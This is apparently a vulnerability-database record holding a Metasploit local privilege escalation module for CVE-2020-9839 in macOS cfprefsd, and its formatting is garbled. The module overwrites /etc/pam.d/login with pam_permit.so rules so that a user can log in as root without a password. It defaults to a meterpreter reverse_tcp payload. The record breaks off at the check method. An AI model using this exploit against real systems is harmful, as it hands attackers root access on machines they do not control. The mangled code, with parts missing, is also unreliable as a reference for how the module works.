{
    "text": "vul_name : macOS cfprefsd Arbitrary File Write / Local Privilege Escalation ， vul_cve : CVE-2020-9839 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Post : File ， include Msf : Post : OSX : Priv ， include Msf : Post : OSX : System ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'macOS cfprefsd Arbitrary File Write Local Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits an arbitrary file write in cfprefsd on macOS <= 10.15.4 in ， order to run a payload as root. The CFPreferencesSetAppValue function , which is ， reachable from most unsandboxed processes , can be exploited with a race condition ， in order to overwrite an arbitrary file as root. By overwriting /etc/pam.d/login ， a user can then login as root with the `login root` command without a password. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Yonghwi Jin <jinmoteam [ at ] gmail.com>' ,  # pwn2own2020 ， 'Jungwon Lim <setuid0 [ at ] protonmail.com>' ,  # pwn2own2020 ， 'Insu Yun <insu [ at ] gatech.edu>' ,  # pwn2own2020 ， 'Taesoo Kim <taesoo [ at ] gatech.edu>' ,  # pwn2own2020 ， 'timwr' # metasploit integration ，  ]  ,  ， ' ，  [ 'CVE' , '2020-9839' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => 'osx' ,  ， 'Arch' => ARCH_X64 ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { 'WfsDelay' => 300 , 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' } ,  ， 'Targets' => [  ，  [ 'Mac OS X x64 ( Native Payload ) ' , {} ]  ,  ，  ]  ,  ， 'DisclosureDate' => 'Mar 18 2020' ， register_advanced_options [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， target_file = \"/etc/pam.d/login\" ， original_content = %q (  # login : auth account password session ， auth optional pam_krb5.so use_kcminit ， auth optional pam_ntlm.so try_first_pass ， auth optional pam_mount.so try_first_pass ， auth required pam_opendirectory.so try_first_pass ， account required pam_nologin.so ， account required pam_opendirectory.so ， password required pam_opendirectory.so ， session required pam_launchd.so ， session required pam_uwtmp.so ， session optional pam_mount.so ， replacement_content = %q (  # login : auth account password session ， auth optional pam_permit.so ， auth optional pam_permit.so ， auth optional pam_permit.so ， auth required pam_permit.so ， account required pam_permit.so ， account required pam_permit.so ， password required pam_permit.so ， session required pam_permit.so ， session required pam_permit.so ， session optional pam_permit.so ， def check ， version = Gem : Version.new ( get_system_version ) ",
    "time": "2020.09.08"
}